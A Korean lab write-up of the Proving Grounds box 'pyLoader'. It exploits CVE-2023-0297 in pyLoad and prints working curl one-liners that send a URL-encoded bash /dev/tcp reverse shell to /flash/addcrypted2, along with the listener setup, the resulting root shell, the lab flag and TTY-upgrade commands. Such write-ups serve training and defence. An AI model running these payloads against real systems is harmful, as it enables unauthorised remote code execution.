| `package=xxx` `crypted=AAAA` `passwords=aaaa` | 핸들러가 요구하는 나머지 필수 폼 필드를 아무 값으로나 채운 것 | 누락하면 핸들러가 파라미터 파싱 단계에서 실패해 `jk` 평가에 도달하기 전에 끝남 |
| `&&passwords=` | 이중 앰퍼샌드 — 빈 파라미터 하나가 낌 | 무해함. 원 스크립트의 오타로 보이며 동작에 영향 없음 |

> [!danger] URL 인코딩이 페이로드의 일부다 — `%20`·`%26`·`%27`·`%2F`
> 본문은 `Content-Type: application/x-www-form-urlencoded` 로 전송됨. 이 포맷에서 `&` 는 파라미터 구분자이고 `+` 는 공백임.
>
> | 원문 | 인코딩 | 인코딩하지 않으면 |
> |---|---|---|
> | `>&` (리다이렉션) | `%3E%26` | **`&` 에서 `jk` 파라미터가 잘림.** 페이로드가 `...bash -i >` 까지만 남아 셸이 안 붙음. 가장 흔한 실패임 |
> | `'` (작은따옴표) | `%27` | 셸에 따라 인용이 깨짐 |
> | ` ` (공백) | `%20` | 폼 인코딩에서 raw 공백은 파서에 따라 불안정 |
> | `/` | `%2F` | 본문에서는 필수가 아님. 안전빵으로 감싼 것 |
>
> 리버스셸 페이로드를 HTTP 파라미터로 밀어넣을 때는 `&`·`;`·`#`·`+`·`%`·공백을 퍼센트 인코딩할 것. [[Squid]]·[[Hawat]]·[[Exfiltrated]] 에서 반복된 「인용이 깨지면 인코딩으로 도망간다」 패턴의 HTTP 판임.

리버스셸 부분 자체도 조각별로 짚어둠.

```bash
bash -c 'bash -i >& /dev/tcp/192.168.45.156/4444 0>&1'
```

| 조각 | 역할 |
|---|---|
| `bash -c '...'` | `os.system()` 은 `/bin/sh` 로 실행함. **Ubuntu 의 `/bin/sh` 는 dash 이고 dash 에는 `/dev/tcp` 가 없음.** `bash -c` 로 한 겹 감싸 bash 에게 넘기는 것이 필수 |
| `bash -i` | 대화형 셸 — 프롬프트가 나오고 잡 제어를 시도 |
| `>&` | stdout 과 stderr 를 함께 리다이렉트(`> ... 2>&1` 의 축약) |
| `/dev/tcp/IP/PORT` | bash 내장 의사 파일. 실제 파일이 아니라 bash 가 TCP 소켓을 열어주는 특수 경로 |
| `0>&1` | stdin 을 그 소켓으로 되돌림 — 이게 있어야 우리가 친 명령이 타겟으로 흘러감 |

#### 익스플로잇 확보 — 두 개를 받았고 하나만 썼다

먼저 GitHub 공개 익스플로잇을 클론함.

```bash
┌──(kali㉿kali)-[~/PG/pyLoader]
└─$ git clone https://github.com/overgrowncarrot1/CVE-2023-0297.git
Cloning into 'CVE-2023-0297'...
remote: Enumerating objects: 6, done.
remote: Counting objects: 100% (6/6), done.
remote: Compressing objects: 100% (5/5), done.
remote: Total 6 (delta 0), reused 0 (delta 0), pack-reused 0 (from 0)
Receiving objects: 100% (6/6), done.
```

![[Pasted image 20260629111431.png]]

그 다음 `searchsploit` 으로 exploit-db 판본도 같은 디렉터리에 받음.

```bash
┌──(kali㉿kali)-[~/PG/pyLoader/CVE-2023-0297]
└─$ searchsploit pyload
-------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                      |  Path
-------------------------------------------------------------------- ---------------------------------
PyLoad 0.5.0 - Pre-auth Remote Code Execution (RCE)                 | python/webapps/51532.py
-------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results

┌──(kali㉿kali)-[~/PG/pyLoader/CVE-2023-0297]
└─$ searchsploit -m 51532
  Exploit: PyLoad 0.5.0 - Pre-auth Remote Code Execution (RCE)
      URL: https://www.exploit-db.com/exploits/51532
     Path: /usr/share/exploitdb/exploits/python/webapps/51532.py
    Codes: CVE-2023-0297
 Verified: True
File Type: Python script, ASCII text executable
Copied to: /home/kali/PG/pyLoader/CVE-2023-0297/51532.py
```

![[Pasted image 20260629111246.png]]
![[Pasted image 20260629111330.png]]
![[Pasted image 20260629111355.png]]

```bash
┌──(kali㉿kali)-[~/PG/pyLoader/CVE-2023-0297]
└─$ ls
51532.py  CVE-2023-0297.sh  README.md
```

**두 판본 중 하나를 「고른」 것이 아님.** 산출물 mtime 과 스크린샷 파일명이 순서를 확정함 — `CVE-2023-0297.sh`(11:08:04) → root 셸 화면 스크린샷 `Pasted image 20260629111100.png`(11:11:00) → `51532.py`(11:12:16). 즉 **GitHub 판본으로 이미 root 를 잡은 뒤 exploit-db 판본을 참고용으로 받아본 것**임. `51532.py` 는 「버렸다」가 아니라 「돌려볼 필요가 없었다」가 정확한 서술임.

`-m <ID>` 는 현재 디렉터리로 복사(mirror)함. 원본(`/usr/share/exploitdb/...`)을 직접 수정하지 않게 해주므로 항상 `-m` 으로 꺼내 쓸 것. `-x <ID>`(내용 보기)와 `-p <ID>`(경로·URL 만)도 같이 외워둘 것.

#### 실행

리스너를 먼저 띄움. 스크립트가 리스너를 켜고 엔터를 누르라며 명시적으로 멈춤.

```bash
┌──(kali㉿kali)-[~/PG/pyLoader]
└─$ rlwrap nc -lnvp 4444
listening on [any] 4444 ...
```

```bash
┌──(kali㉿kali)-[~/PG/pyLoader/CVE-2023-0297]
└─$ bash CVE-2023-0297.sh -l 192.168.45.156 -p 4444 -w http://192.168.132.26:9666
         _____ _____  _____    ________   ___     _____  ___ ______
        |  _  |  __ \/  __ \   | ___ \ \ / / |   |  _  |/ _ \|  _  \
        | | | | |  \/| /  \/   | |_/ /\ V /| |   | | | / /_\ \ | | |
        | | | | | __ | |       |  __/  \ / | |   | | | |  _  | | | |
        \ \_/ / |_\ \| \__/\   | |     | | | |___\ \_/ / | | | |/ /
         \___/ \____/ \____/   \_|     \_/ \_____/\___/\_| |_/___/


Run nc -lvnp 4444, press enter to continue
```

![[Pasted image 20260629111457.png]]

| 인자 | 값 | 주의점 |
|---|---|---|
| `-l` | `192.168.45.156` | **Kali 의 `tun0` IP 임.** VPN 재접속마다 바뀜 — `ip -br a` 로 매번 확인 |
| `-p` | `4444` | 리스너 포트와 일치해야 함 |
| `-w` | `http://192.168.132.26:9666` | 스킴(`http://`)과 포트를 모두 적어야 함. 스크립트가 뒤에 `/flash/addcrypted2` 를 그대로 이어 붙임 |

리스너를 `rlwrap nc -lnvp 4444` 로 감싼 것은 readline 을 얹기 위해서임. ↑↓ 명령 히스토리와 ←→ 커서 이동이 생김. TTY 없는 리버스셸에서는 오타를 백스페이스로 못 고치는데 `rlwrap` 이 그 고통을 절반쯤 없애줌. `nc` 플래그는 `-l` 리슨, `-n` DNS 역조회 안 함(느려지는 것 방지), `-v` 접속 표시, `-p` 포트임.

#### 자동 도구 대신 — `curl` 한 줄

`CVE-2023-0297.sh` 에서 배너와 인자 파싱을 걷어내면 마지막 한 줄이 전부임.

```bash
curl -i -s -k -X POST --data-binary "jk=pyimport%20os;os.system(\"bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F${LHOST}%2F${LPORT}%200%3E%261%27\");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa"  "${WEBHOST}/flash/addcrypted2"
```
— 출처: `~/PG/pyLoader/CVE-2023-0297/CVE-2023-0297.sh`

스크립트 없이 그대로 칠 수 있는 수동 원라이너:

```bash
curl -s -X POST --data-binary \
  'jk=pyimport%20os;os.system("bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.5%2F4444%200%3E%261%27");f=function%20f2(){};&package=xxx&crypted=AAAA&passwords=aaaa' \
  'http://TARGET:9666/flash/addcrypted2'
```

| 플래그 | 역할 | 빼면 어떻게 되는가 |
|---|---|---|
| `-X POST` | 메서드 강제 | `--data-binary` 가 이미 POST 를 유발하므로 없어도 됨. 다만 명시가 안전 |
| `--data-binary` | 본문을 가공 없이 그대로 전송 | `-d`/`--data` 는 `@파일` 입력에서 개행을 제거함. 인라인 문자열이면 동작은 같으나 페이로드를 파일로 빼는 순간 `-d` 는 깨지므로 습관을 `--data-binary` 로 고정하는 편이 안전 |
| (Content-Type) | 자동으로 `application/x-www-form-urlencoded` | 핸들러가 요구하는 타입과 일치. 다른 타입으로 보내면 파라미터가 파싱되지 않음 |
| `-i` | 응답 헤더 포함 출력 | 없어도 무방. 있으면 200/404/500 판별이 쉬워 디버깅에 유리 |
| `-s` | 진행률 억제 | 출력이 지저분해질 뿐 |
| `-k` | TLS 인증서 검증 무시 | 여기서는 무의미(평문 HTTP). HTTPS 타겟에서만 의미가 있음 |

**`--data-urlencode` 를 쓰면 안 됨.** 페이로드는 이미 퍼센트 인코딩된 상태라 `--data-urlencode` 를 거치면 `%` 가 다시 `%25` 로 이중 인코딩되어 서버에서 `%20` 이 공백이 아니라 문자열 `%20` 으로 복원됨. 페이로드가 통째로 죽음.

#### 셸 획득 — 곧바로 root

```bash
┌──(kali㉿kali)-[~/PG/pyLoader]
└─$ rlwrap nc -lnvp 4444
listening on [any] 4444 ...
connect to [192.168.45.156] from (UNKNOWN) [192.168.132.26] 39058
bash: cannot set terminal process group (902): Inappropriate ioctl for device
bash: no job control in this shell
root@pyloader:~/.pyload/data# whoami
whoami
root
```
— 출처: 스크린샷 `Pasted image 20260629111100.png`

> [!note] `cannot set terminal process group` · `no job control` 은 에러가 아니다
> `bash -i` 가 TTY 가 아닌 소켓 위에서 돌기 때문에 나오는 정상 경고임. 셸은 멀쩡히 동작함.
> 다만 이 상태에서는 `ssh`·`vi` 같은 전체화면/TTY 요구 프로그램이 깨지고 Ctrl+C 가 셸을 끊음. 필요하면 TTY 를 올릴 것:
> ```bash
> python3 -c 'import pty; pty.spawn("/bin/bash")'
> # Ctrl+Z → stty raw -echo; fg → Enter Enter
> export TERM=xterm
> ```
> 이 박스는 이미 root 라 TTY 업그레이드가 필요 없었음.

프롬프트 `root@pyloader:~/.pyload/data#` 가 `Service Enumeration` 절의 예측을 그대로 확인해 줌. 작업 디렉터리가 `/root/.pyload/data` 이고 **사용자가 root** 임.

**Local.txt value:**
**없음.** 이 박스의 플래그는 `/root/proof.txt` 하나임 — foothold 가 이미 root 라 저권한 플래그를 둘 자리가 없음. 근거는 root 셸에서 `/root/` 를 나열한 화면(`Downloads`·`email5.txt`·`proof.txt`·`snap`)이고, `local.txt` 는 존재하지 않음. ⚠️ **[가정]** 파일시스템 전수 탐색(`find / -name local.txt`)은 실행하지 않았음 — `harvest.sh` 를 돌리지 않아 산출물이 없음.

### Privilege Escalation – 없음 (pyLoad 프로세스가 root 로 구동돼 초기 접근이 곧 root)

**Vulnerability Explanation:** 별도 권한상승 취약점 없음. pyLoad 프로세스가 uid 0 으로 구동돼 `/flash/addcrypted2` 의 `os.system()` 이 처음부터 root 로 실행됨. 리버스셸 첫 줄부터 프롬프트가 `root@pyloader:~/.pyload/data#` 이고 `whoami` → `root`.

**Vulnerability Fix:** 해당 없음 — `Initial Access` 의 Fix 중 「pyLoad 를 root 로 실행하지 말 것(전용 계정 systemd 유닛)」이 이 항목도 함께 닫음.

**Severity:** 해당 없음 — 심각도는 `Initial Access` 에 계상(Critical).

**Steps to reproduce the attack:** 해당 없음 — 추가 단계 없이 최초 셸이 root.

권한상승 단계가 존재하지 않음. **pyLoad 프로세스가 root 로 돌았기 때문**임. 근거는 셋이고 전부 실측임.

| # | 근거 | 출처 |
|---|---|---|
| 1 | `Config Folder = /root/.pyload` | pyLoad 정보 페이지 — 익스플로잇 **이전에** 관측 |
| 2 | `Download Folder = /root/Downloads/pyLoad` | 같은 페이지 |
| 3 | 셸 프롬프트 `root@pyloader:~/.pyload/data#` · `whoami` → `root` | 리버스셸 |

`Installation Folder` 가 `/usr/local/lib/python3.10/dist-packages/pyload` 인 것을 보면 어떻게 이렇게 됐는지도 짐작이 감. `sudo pip install pyload-ng` 로 시스템 전역에 설치한 뒤 root 셸에서 그냥 실행하면 정확히 이 모양이 됨. systemd 유닛으로 등록하고 `User=pyload` 를 지정했다면 foothold 는 비특권 계정이었을 것이고 권한상승이라는 두 번째 관문이 생겼을 것임.

이 박스에서 root 가 아니었다면 다음 수는 pyLoad 설정 폴더였음. `/root/.pyload/` 안에는 `settings/pyload.cfg` 와 DB(`files.db`)가 있고, 저장된 자격증명(다운로드 사이트 계정 등)을 찾아 재사용을 시도하는 것이 정석임. **애플리케이션 설정 디렉터리는 대개 자격증명 저장소임** — [[plum]] 에서 메일함이, [[Codo]] 에서 설정 파일이 같은 역할을 했음.

### Post-Exploitation

**Proof.txt value:**
`8e83040ffcced0d40655d685a19821af`

```bash
root@pyloader:~/.pyload/data# cd /root/
cd /root/
root@pyloader:~# ls
ls
Downloads
email5.txt
proof.txt
snap
root@pyloader:~# cat proof.txt
cat proof.txt
8e83040ffcced0d40655d685a19821af
root@pyloader:~#
```
— 출처: 스크린샷 `Pasted image 20260629111100.png`

![[Pasted image 20260629111100.png]]

> [!warning] 이 해시는 2026-06-29 인스턴스의 값이다
> PG 는 박스를 리버트하거나 다시 켤 때마다 플래그를 새로 만듦. 값을 외우지 말고 경로(`/root/proof.txt`)와 재현 절차를 외울 것.

⚠️ **시험 증거 형식은 충족하지 못했음.** OSCP 는 플래그 값만으로 인정하지 않고 `whoami`·`hostname`·`ip a`·`cat proof.txt` 가 한 화면에 있어야 함. 위 화면에는 `whoami`·프롬프트의 호스트명·플래그는 있으나 **`ip a`(타겟 IP)가 없음.** TTY 없는 셸에서는 `;` 로 이어 붙인 한 줄이 안전함 — 여러 번 나눠 치면 스크롤로 잘려 한 화면에 안 담김.

```bash
whoami; hostname; ip a; cat /root/proof.txt
```

**소요 시간** — 정찰 시작 10:45:55(`nmap.log` 헤더) → root 셸 11:11:00 이전(플래그 스크린샷 파일명), 약 **25분**. 권한상승 0분.

**남긴 흔적**
- 타겟에 파일을 떨어뜨리지 않았음. 페이로드가 `bash -i` 원라이너라 디스크에 남는 것이 없음
- 남는 것은 프로세스와 로그뿐임 — pyLoad 로그의 `/flash/addcrypted2` POST 기록, `bash` 자식 프로세스. 리버스셸을 끊으면 정리됨
- 획득 자격증명: pyLoad 웹UI `pyload` / `pyload`(기본값)
- 미열람 파일: `/root/email5.txt`(존재만 확인). 랩에서 이런 파일은 다른 박스로 이어지는 힌트이거나 시나리오 소품인 경우가 많음 — **root 를 잡으면 `/root/` 전체를 한 번 훑을 것**
- Kali 쪽 리스너·tmux 정리 기록은 남아 있지 않음 — 관측 없음

## 관련

1차 사료 — 이 노트의 메커니즘 서술은 전부 아래에서 직접 확인함. 블로그 요약은 근거로 쓰지 않았음.

- CVE-2023-0297 — NVD: <https://nvd.nist.gov/vuln/detail/CVE-2023-0297> (CVSS 9.8, CWE-94)
- GHSA-pf38-5p22-x6h6 — <https://github.com/advisories/GHSA-pf38-5p22-x6h6> · `pyload-ng < 0.5.0b3.dev31`, 최초 패치 `0.5.0b3.dev31`
- 패치 커밋 `7d73ba7919e594d783b3411d7ddb87885aea782d` — *"fix arbitrary python code execution by abusing js2py functionality"* (2023-01-03, `src/pyload/core/utils/misc.py` 한 줄)
- 취약 코드 원문 `src/pyload/webui/app/blueprints/cnl_blueprint.py` @ `6aa71cd99a6f510de7137d17ec99f930916704c0` — `local_check` 데코레이터와 `eval_js(f"{jk} f()")`
- `ClickNLoad` 애드온 원문 `src/pyload/plugins/addons/ClickNLoad.py` @ 같은 커밋 — `extern` 기본값 `True`, 포트 9666, 원시 TCP 포워딩
- pyLoad 기본 설정 `src/pyload/core/config/default.cfg` — `int port : "Port" = 8000`(웹UI 기본 포트)
- `js2py` — `translators/translating_nodes.py` 의 `PyimportStatement()`, `evaljs.py` 의 `disable_pyimport()`: <https://github.com/PiotrDabkowski/Js2Py>
- 후속 취약점 GHSA-r9pp-r4xf-597r / CVE-2024-39205 — 같은 `/flash/addcrypted2`, `pyload-ng <= 0.5.0b3.dev85`. Host 헤더 우회를 벤더가 명시적으로 인정한 문서
- js2py 완전 제거 커밋 `aa9300fb4e52`(2025-08-20) *"remove js2py and dukpy in favour of mini-racer"*
- 공개 익스플로잇(실제로 사용): <https://github.com/overgrowncarrot1/CVE-2023-0297>
- exploit-db 51532(받았으나 미사용): <https://www.exploit-db.com/exploits/51532>
- `/dev/tcp` 리버스셸 및 대안: PayloadsAllTheThings — Reverse Shell Cheatsheet

- [[_PLAYBOOK#A-1-12. 「top-1000 밖이라 못 봤다」 — 예열 스캔의 «범위»부터 확인한다]] · [[_PLAYBOOK#A-11. 자동 도구가 뱉은 값이 의심스럽다]] · [[_PLAYBOOK#A-13. 익스플로잇을 던지기 전에 버전과 CVE 표기를 검증한다]]
- [[_PLAYBOOK#A-14. 공개 PoC는 실행 전에 소스를 읽는다]] · [[_PLAYBOOK#A-12. 응답이 성공을 뜻하지 않는다]] · [[_PLAYBOOK#A-31. 리버스셸이 안 붙는다]] · [[_PLAYBOOK#A-64. 사후에 시간 서사를 복원하는 법 — mtime + 스크린샷 파일명]]
- [[_PLAYBOOK#B-15. 헤더 기반 IP 접근제어 우회]] · [[_PLAYBOOK#B-1-37. 로그인 폼을 만나면 기본 자격증명이 1순위 — 제품별 기본값 표]]
- [[_PLAYBOOK#A-2-29. 앱 전체가 로그인 뒤에 있어 보인다 — 인증 예외 목록부터 노린다]] · [[_PLAYBOOK#A-2-30. 페이로드는 맞는데 200 이 온다 — 내 전송 계층이 이미 디코드했다]] · [[_PLAYBOOK#A-61. 관측은 맞는데 결론이 어긋난다]]
- [[_PLAYBOOK#B-1-39. 인터프리터에 사용자 문자열이 들어가면 RCE 다 — js2py `pyimport`(CVE-2023-0297)]] · [[_PLAYBOOK#B-1-40. 관리 화면이 렌더한 «경로»가 실행 계정을 말해준다 — 권한상승 유무를 익스플로잇 전에 안다]] · [[_PLAYBOOK#B-89. 리스너는 `tmux` + `rlwrap` 으로 띄운다]]
- [[plum]] — 같은 날 푼 박스. 웹앱 기본 자격증명(`admin/admin`) → 인증 후 RCE. pyLoader 가 pre-auth 라 로그인이 불필요했던 것과 대비됨
- [[Squid]] — 관리 화면이 설치 경로를 유출해 다음 수를 결정해준 같은 패턴(`phpinfo` → `C:\wamp\`). 설정값과 실제가 어긋나는 함정(MariaDB 3307)도 동일
- [[Codo]] — nmap OS 추측을 버리고 서비스 배너의 패키지 리비전으로 배포판을 확정하는 규칙. TTY 없는 셸의 한계
- [[Crane]] · [[RubyDome]] · [[Astronaut]] · [[Exghost]] · [[Hawat]] — 누적 패턴 「응답이 성공을 뜻하지 않는다」. 이 박스에서는 `51532.py` 의 무조건 성공 메시지가 같은 계열
- [[Hub]] · [[Levram]] — 누적 패턴 「버전 판정은 독립 근거 2개」
- [[Robust]] — 「302 여도 본문이 있다」와 출발지 IP 기반 접근제어 우회가 같은 계열
